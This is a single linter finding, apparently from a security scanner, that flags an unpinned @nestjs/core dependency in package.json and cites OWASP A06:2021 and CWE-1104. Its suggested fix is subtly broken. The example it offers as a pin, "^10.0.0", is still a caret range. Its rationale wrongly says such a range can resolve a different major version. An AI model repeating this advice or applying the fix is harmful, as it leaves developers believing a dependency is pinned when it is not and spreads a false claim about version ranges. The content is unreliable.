MEDIUM  likely  internal  Dependency version is unpinned  A06:2021
------------------------------------------------------------------------
 package.json:17:1

 -> fix (NestJS)   Pin the dependency in package.json and reinstall so
                   the lockfile records it.
                   {
                     "dependencies": {
                       "@nestjs/core": "^10.0.0"
                     }
                   }
 -> why            An unpinned range lets the next install resolve a
                   different major version, including one with a known
                   vulnerability or a breaking API change, without
                   anyone reviewing the bump.
 i  ref            OWASP A06:2021 | CWE-1104 |
                   RULES.md#unpinned-dependency

